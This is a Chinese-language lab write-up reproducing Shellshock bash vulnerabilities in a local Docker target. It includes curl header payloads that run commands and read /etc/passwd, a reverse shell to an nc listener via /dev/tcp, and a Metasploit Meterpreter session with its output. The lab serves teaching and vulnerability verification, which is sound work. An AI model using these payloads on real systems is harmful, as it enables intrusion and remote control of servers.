# 初始化环境配置

## 注意事项

```bash
# 建议在tmux中进行命令行操作，避免误关闭当前命令行窗口导致操作意外中断
sudo apt update && sudo apt install tmux
```

## 简单方法

```bash
# 查看当前系统版本
lsb_release -d
# Description:	Ubuntu 16.04.3 LTS

# 安装 pip
sudo apt install python-pip

# 安装compose
pip install docker-compose
```

## 优雅方法

```bash
# 安装 pip
sudo apt install python-pip

# 安装 pyenv
curl -L https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash

# 添加以下3行指令到 ~/.bashrc
export PATH="~/.pyenv/bin:$PATH"
eval "$(pyenv init -)"
eval "$(pyenv virtualenv-init -)"

# 安装 python 源码编译所需要依赖的lib
# ref: https://github.com/pyenv/pyenv/wiki/Common-build-problems
sudo apt update && sudo apt install -y make build-essential libssl-dev zlib1g-dev libbz2-dev \
libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev \
xz-utils tk-dev

# 安装 python 3.6.x ，此处支持版本信息 TAB+TAB 自动补全
# 如果下载时间过长，可以参考 pyenv 安装指定python版本国内镜像加速
pyenv install 3.6.4

# 安装 pipenv
pip install pipenv

# 设置 pipenv 在 bash 环境中的自动补全
# 添加 以下命令  到 ~/.bashrc
eval "$(pipenv --completion)"

# cd 到 vulhub 所在代码根目录
pyenv local 3.6.4
pipenv install docker-compose
pipenv shell

# 普通用户权限编译当前 Dockerfile 和启动容器 的注意事项
sudo $(which docker-compose) build
sudo $(which docker-compose) up -d
```

### pyenv 安装指定python版本国内镜像加速

```bash
PYENV_CACHE="~/.pyenv/cache"
PY_VER="3.6.4" # 根据需要修改为你想要安装的python版本号
PY_URL="http://mirrors.sohu.com/python/${PY_VER}/Python-${PY_VER}.tar.xz"
[ -d ${PYENV_CACHE} ] ||  mkdir -p ${PYENV_CACHE} 
cd ${PYENV_CACHE} && wget ${PY_URL}
[ $? -eq 0 ] && pyenv install ${PY_VER}
```

# 相关漏洞总结

[GNU » Bash : Security Vulnerabilities Published In 2014](https://www.cvedetails.com/vulnerability-list.php?vendor_id=72&product_id=21050&version_id=&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=2014&month=0&cweid=0&order=2&trc=6&sha=680c4355bdd4ddd349907d67b6330425f8f5c193)

# 漏洞利用复现

## 漏洞存在性证明

```bash
# 针对未打补丁的bash进行shellshock攻击可以执行任意指令
curl -H "User-Agent: () { foo;}; echo \"Content-Type: text/plain\" ; echo ; /usr/bin/id" http://127.0.0.1/victim.cgi
curl -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://127.0.0.1/victim.cgi
```

![](attach/img/poc-1.png)

```bash
# 针对已打补丁的bash进行shellshock攻击无效
curl -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://127.0.0.1/safe.cgi
curl -H "User-Agent: () { foo;}; echo \"Content-Type: text/plain\" ; echo ; /usr/bin/id" http://127.0.0.1/safe.cgi
```

![](attach/img/poc-2.png)

### 使用nmap

```bash
# ref: https://nmap.org/nsedoc/scripts/http-shellshock.html
# 经过实际测试，如果不指定使用 header=User-Agent 参数，当前目标靶机环境会返回 400 错误，导致检测出现误报（不存在shellshock漏洞）
nmap -sV -p 80 --script http-shellshock --script-args header=User-Agent,uri=/victim.cgi 192.168.123.121

Starting Nmap 7.01 ( https://nmap.org ) at 2018-01-23 21:27 CST
Nmap scan report for bogon (192.168.123.121)
Host is up (0.00035s latency).
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Unix))
|_http-server-header: Apache/2.4.25 (Unix)
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known as Shellshock. It seems the server
|       is executing commands injected via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
```

经验分享：

* 在虚拟机环境中使用 ``tcpdump`` 抓包保存为 ``.pcap`` 格式文件，使用 ``scapy`` 读取抓包文件，可以在命令行方式中更优雅的查看任意报文
* Kali内置了 ``scapy`` ，scapy的使用入门可以查看 [我的在线电子教材 - 基于Scapy的无线网络监听编程实践](http://sec.cuc.edu.cn/huangwei/textbook/mis/chap0x02/scapy.html)
* nmap的 ``.nse`` 脚本调试可以使用诸如 ``stdnse.debug1("req.body: '%s'", req.body)`` 这样的语句打印关键变量，nmap执行扫描时可以使用 ``-d`` 参数开启 ``.nse`` 脚本中的 ``stdnse.debug1()`` 打印输出显示

### CVE-2014-6271

```bash
# 以下 POC 代码执行完毕之后会在容器环境中创建文件 /tmp/poc ，且文件内容是 CVE-2014-6271 vulnerable
curl -H "User-Agent: () { :; }; echo \"Content-Type: text/plain\"; echo \"CVE-2014-6271 vulnerable\" > /tmp/poc" http://127.0.0.1/victim.cgi
```

![](attach/img/poc-CVE-2014-6271.png)

![](attach/img/poc-result-CVE-2014-6271.png)

### CVE-2014-6277

```bash
# 容器本地测试 PoC
env X='() { x() { _; }; x() { _; } <<a; }' /usr/local/bash-4.3.0/bin/bash -c :

# 以下 PoC 会导致 HTTP服务器 500错误
curl -H "User-Agent: () { x() { _; }; x() { _; } <<a; }" http://127.0.0.1/victim.cgi

# 已打补丁的CGI访问是正常的 200 HTTP响应码
curl -H "User-Agent: () { x() { _; }; x() { _; } <<a; }" http://127.0.0.1/safe.cgi
```

### CVE-2014-6278

```bash
# 容器本地测试 PoC
env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' /usr/local/bash-4.3.0/bin/bash -c :

# 远程测试 PoC-1.0
curl -H "User-Agent: () { _; } >_[\$(\$())] { id > /tmp/CVE-2014-6278.txt; }" http://127.0.0.1/victim.cgi

# 远程测试 PoC-1.1
curl -H "Cookie: () { _; } >_[\$(\$())] { id > /tmp/CVE-2014-6278.txt; }" http://127.0.0.1/victim.cgi

# 远程测试 PoC-2
time curl -H "User-Agent: () { _; } >_[\$(\$())] { sleep 5; }" http://127.0.0.1/victim.cgi
```

### CVE-2014-7169

```bash
# TODO 目前只测试验证了本地环境exploit，远程CGI环境的exploit还没有复现成功
# 以下命令执行成功后会在当前目录下创建一个名为 echo 的文件，文件内容是以下命令的执行时间
env X='() { (a)=>\' /usr/local/bash-4.3.0/bin/bash -c "echo date"; cat echo

curl -H "User-Agent: '() { (a)=>\\' /usr/local/bash-4.3.0/bin/bash -c \"echo date\"; cat echo" http://127.0.0.1/victim.cgi

# 已打补丁情况下的测试
env X='() { (a)=>\' bash -c "echo date"; cat echo
```

### CVE-2014-7186

```bash
# TODO 目前只测试验证了本地环境exploit，远程CGI环境的exploit还没有复现成功
/usr/local/bash-4.3.0/bin/bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"

# 已打补丁情况下的测试
bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"
```

### CVE-2014-7187

```bash
# TODO 目前只测试验证了本地环境exploit，本地和远程CGI环境的exploit均没有复现成功
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | /usr/local/bash-4.3.0/bin/bash || echo "CVE-2014-7187 vulnerable, word_lineno"

# 已打补丁情况下的测试
(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"
```

## 漏洞实战利用

```bash
# 安装 nc
sudo apt update && sudo apt install netcat

# 在docker的宿主机上 nc 建立本地监听
# 在一个 tmux 窗口中开启nc监听
nc.traditional -l -p 7777

# 在另一个 tmux 窗口中发起攻击
# 建立反向连接
# 此处 docker 宿主机的容器默认网卡IP是 172.17.0.1
# 攻击成功终端没有任何回显，会“卡住”当前curl连接，最后504超时退出当前http连接但并不会影响已经建立起的反向连接
curl -H "User-Agent: () { ignored;};/usr/local/bash-4.3.0/bin/bash -i >& /dev/tcp/172.17.0.1/7777 0>&1" http://127.0.0.1/victim.cgi
```

![](attach/img/exploit-1.png)

下图是在 docker 宿主机上获得的反向连接shell执行命令的效果截图，证明我们已经拿到了远程靶机容器的一个普通用户权限shell。

![](attach/img/exploit-2.png)

### 使用metasploit

```bash
# on Kali
systemctl start postgresql
msfdb init
msfconsole
# 以下命令在 msfconsole 中输入

# 重建缓存是在后台执行的，需要很长时间 
db_rebuild_cache

# 搜索 bash 相关exploit
# 在缓存没有重建完毕之前，会有一个警告信息提示如下，可以安全的忽略掉： 
# [!] Module database cache not built yet, using slow search
search base 

use exploit/multi/http/apache_mod_cgi_bash_env_exec

# 查看所有可用配置参数
show options

set rhost 192.168.123.121
set TARGETURI /victim.cgi

# 先验证漏洞的可利用性
# 如果可利用，会显示： [+] 192.168.123.121:80 The target is vulnerable.
check

# 查看所有可用的攻击向量
show payloads

set linux/x86/meterpreter/reverse_tcp

# 查看攻击向量的所有可用配置参数
show options

set LHOST 192.168.123.104

exploit

[*] Started reverse TCP handler on 192.168.123.104:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (847604 bytes) to 192.168.123.121
[*] Meterpreter session 1 opened (192.168.123.104:4444 -> 192.168.123.121:48030) at 2018-01-23 21:57:21 +0800

meterpreter > getuid
Server username: uid=1, gid=1, euid=1, egid=1
meterpreter > pwd
/usr/local/apache2/htdocs
meterpreter > sysinfo
Computer     : 172.18.0.2
OS           : Debian 8.7 (Linux 4.10.0-28-generic)
Architecture : x64
Meterpreter  : x86/linux

meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0


Interface 14
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.18.0.2
IPv4 Netmask : 255.255.0.0

# 启动一个系统shell
shell

# 由于容器环境中默认没有提供 sudo ，所以使用 sudo 提权会失败
```

# 漏洞利用的其他形式

[PHP < 5.6.2 - 'Shellshock' 'disable_functions()' Bypass Command Injection](https://www.exploit-db.com/exploits/35146/)

上面这个例子很好的说明了：一个漏洞的出现，往往会带来很多意想不到的创新利用方式。一个原本安全的防御机制（如这里的PHP的 ``函数黑名单机制`` 原本可以对命令注入攻击实现漏洞利用缓解效果）可能会因为一个第三方软件的漏洞而被绕过。这就是漏洞利用的艺术，这就是实际网络攻击往往不是单一漏洞利用过程的真实例子证明。


# 参考资料

* [Shellshock \(software bug\)](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)
* [Shellshocker - Repository of "Shellshock" Proof of Concept Code](https://github.com/mubix/shellshocker-pocs)
* [GNU » Bash : Security Vulnerabilities Published In 2014](https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-21050/year-2014/GNU-Bash.html)
* [Bash 漏洞是什么级别的漏洞，有什么危害，具体如何修复？](https://www.zhihu.com/question/25522948)
* [BurpSuite主动和被动扫描插件 ActiveScan++，可以检测 CVE-2014-6271/CVE-2014-6278 存在性](https://github.com/albinowax/ActiveScanPlusPlus)

